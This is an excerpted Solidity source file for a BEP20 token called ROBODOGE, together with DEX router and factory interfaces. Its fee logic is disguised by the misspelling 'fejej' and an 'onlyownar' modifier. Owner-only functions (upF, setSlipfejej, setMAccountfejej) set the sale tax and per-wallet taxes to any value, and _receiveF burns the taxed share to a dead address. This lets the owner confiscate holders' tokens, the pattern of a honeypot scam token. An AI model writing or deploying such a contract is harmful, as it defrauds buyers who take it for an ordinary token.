...
interface IUniswapV2Factory {
    ...
    function fejejTo() external view returns (address);
    function fejejToSetter() external view returns (address);
    ...
    function setfejejTo(address) external;
    function setfejejToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfejejOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfejejOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfejejOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfejejOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfejejOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ROBODOGE is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfejej = 0;

    uint256 private _defaultBuyfejej = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfejej;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfejej = _value;
    }

    function setSlipfejej(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfejej[_address] = _value;
    }

    function getSlipfejej(address _address) external view onlyownar returns (uint256) {
        return _slipfejej[_address];
    }


    function setMAccountfejej(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfejej(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefejejAmount = 0;

        if (rF) {
            uint256 tradefejej = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefejej = _defaultSellfejej;
                }
                if (from == uniswapV2Pair) {

                    tradefejej = _defaultBuyfejej;
                }
            }
            if (_slipfejej[from] > 0) {
                tradefejej = _slipfejej[from];
            }

            tradefejejAmount = _Amount.mul(tradefejej).div(100);
        }


        if (tradefejejAmount > 0) {
            _balances[from] = _balances[from].sub(tradefejejAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefejejAmount);
            emit Transfer(from, _deadAddress, tradefejejAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefejejAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefejejAmount);
        emit Transfer(from, _to, _Amount - tradefejejAmount);
    }
